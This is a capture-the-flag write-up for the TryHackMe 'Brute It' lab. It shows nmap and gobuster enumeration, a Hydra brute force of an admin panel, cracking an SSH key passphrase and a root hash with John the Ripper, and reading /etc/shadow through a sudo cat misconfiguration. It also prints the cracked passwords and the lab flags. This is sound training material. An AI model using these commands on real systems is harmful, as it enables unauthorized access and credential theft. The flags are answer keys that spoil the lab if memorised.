# Brute It - TryHackMe

Linux machine with two exposed services. The attack path chains web directory enumeration, credential brute force against an admin panel, SSH private key cracking, and a sudo misconfiguration that allows reading `/etc/shadow` as root.

---

## Enumeration

### Network Scanning

```bash
nmap -sC -sV <target_ip>
```

Open ports:

- 22/tcp - SSH (OpenSSH 7.6p1)
- 80/tcp - HTTP (Apache 2.4.29, Ubuntu)

### Web Enumeration

The default Apache page offered no immediate leads. Directory enumeration revealed a hidden admin panel:

```bash
gobuster dir -u http://<target_ip> -x html,php,txt -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

Result: `/admin` - a login form.

Reviewing the page source exposed a hardcoded hint:

```html
<!-- Hey john, if you do not remember, the username is admin -->
```

This confirmed the admin panel username and introduced a second username (`john`) relevant to later stages.

---

## Initial Access

### Admin Panel Brute Force

With the username known, Hydra against the login form was straightforward:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target_ip> http-post-form \
"/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid" -f -V
```

Valid credentials found:

```
admin:xavier
```

### Retrieving the Web Flag and SSH Key

Logging into the admin panel yielded the first flag and a downloadable SSH private key (`id_rsa`) belonging to user `john`.

```
THM{brut3_f0rce_is_e4sy}
```

### Cracking the SSH Key Passphrase

The key was passphrase-protected. Converting it to a crackable format and running John the Ripper:

```bash
python3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

Passphrase recovered:

```
rockinroll
```

### SSH Access as john

```bash
chmod 600 id_rsa
ssh -i id_rsa john@<target_ip>
```

---

## Privilege Escalation

### Sudo Enumeration

```bash
sudo -l
```

Output:

```
(root) NOPASSWD: /bin/cat
```

`john` can run `cat` as root without a password - enough to read any file on the system.

### Reading /etc/shadow

```bash
sudo cat /etc/shadow
```

The root entry:

```
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
```

The `$6$` prefix identifies a SHA-512 crypt hash.

### Cracking the Root Hash

```bash
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt root.hash
```

Root password recovered:

```
football
```

### Escalation to Root

```bash
su root
```

```bash
whoami
```

```
root
```

---

## Flags

```
web flag  -> THM{brut3_f0rce_is_e4sy}
user.txt  -> THM{a_password_is_not_a_barrier}
root.txt  -> THM{pr1v1l3g3_3sc4l4t10n}
```

---

## Key Takeaways

- A known username reduces brute force from guessing to grinding - Hydra becomes far more effective.
- A passphrase-protected SSH key is not useless to an attacker; it is crackable offline material.
- `sudo -l` is always the first check after gaining a shell. A single misconfigured entry can unlock the whole system.
- Allowing `cat` as root without a password is effectively a full credential disclosure: `/etc/shadow`, `/etc/passwd`, configuration files, private keys - all readable.
- Two separate cracking operations (key passphrase + root hash) are independent problems; treat them as such.

---

## Disclaimer

This lab was completed in a controlled environment provided by TryHackMe. All actions were performed strictly for educational purposes.
